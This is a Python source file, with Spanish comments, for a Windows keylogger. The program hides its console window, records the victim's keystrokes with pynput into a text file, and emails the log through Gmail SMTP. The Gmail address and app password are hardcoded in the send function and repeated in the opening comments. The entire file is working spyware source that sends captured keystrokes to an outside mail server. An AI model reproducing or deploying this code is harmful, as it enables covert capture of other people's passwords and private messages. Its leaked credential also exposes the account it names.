#R00Tl234
#App password
#  peqcrlrletzihvug
from pynput import keyboard
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import win32console
import win32gui
import pyautogui

	

#myScreenshot = pyautogui.screenshot()
#myScreenshot.save(r'name.png')

class Keylogger:
    def __init__(self):
        self.lista_teclas = []    
        self.registro_txt = open('registro.txt', 'w+')
        
    
    #datos al correo
    def enviar_datos(self):
        print("entro 1")
        msg = MIMEMultipart()
        password = "peqcrlrletzihvug"
        msg['From'] = "lupfc2@gmail.com"
        msg['To'] = "lupfc2@gmail.com"
        msg['Subject'] = "Keylogger"
        msg.attach(MIMEText(open('registro.txt', 'r').read()))

        #Comprobamos si se conecto
        try: 
            print("entro 2")
            server = smtplib.SMTP('smtp.gmail.com:587')#establecemos puerto
            server.starttls()#comunicacion segura con servidor
            server.login(msg['From'], password)#nos logeamos con la cuenta gmail
            server.sendmail(msg['From'], msg['To'], msg)#enviamos correo electronico
            server.quit()#cerramos servidor
        except:
            print("no pudo enviar al correo el ,mensaje")

    def imprimir(self):
        #volvemos string la lista de palabras
        teclas = ''.join([str(i) for i in self.lista_teclas])
        
        #colocamos las teclas en las documentos de texto
        self.registro_txt.write(teclas)
        self.registro_txt.write("\n")
        self.registro_txt.close()

        #tiempo de espera con el correo
        time.sleep(3)
        self.enviar_datos()


    def presiona(self, key):
        # key1 = convertir(key)
        #print("tecla presionada: {}".format(self.convertir(key)))
        key1 = self.convertir(key)

        #comprombamos caracteres

        if key1 == keyboard.Key.esc: #salimos del programa
            print("Saliendo...")
            self.imprimir()
            return False
        elif key1 == keyboard.Key.space: #detectamos los espacios
            self.lista_teclas.append(" ")
        elif key1 == keyboard.Key.enter:
            self.lista_teclas.append("\n")

        #las intruciones con el pass no deben ser tomandas en cuenta
        elif key1 == keyboard.Key.backspace:
            pass
        elif key1 == keyboard.Key.shift:
            pass
        elif key1 == keyboard.Key.tab:
            pass
        else:
            self.lista_teclas.append(key1)

    #no se usa por el moemnto, usado en face anterior
    def libera(self, key):
        print("Tecla liberada: {}".format(self.convertir(key)))
        if key == keyboard.Key.esc:
            print("saleiendo del programa ...")
            return False
    

    
    def convertir(self, key):
        #isinstance ve si el primer argumento sea objeto o subclase del segundo elemento
        if isinstance(key, keyboard.Key):#entran los caracteres normales
            return key
        else:#si usamos letras como space o exit lo volveremos tring
            return key.char
    def empezar(self):
        with keyboard.Listener(on_press=self.presiona) as listen:
            listen.join()


if __name__ == "__main__":   
    ventana = win32console.GetConsoleWindow()
    win32gui.ShowWindow(ventana, 0)
    ke = Keylogger()
    ke.empezar()



    
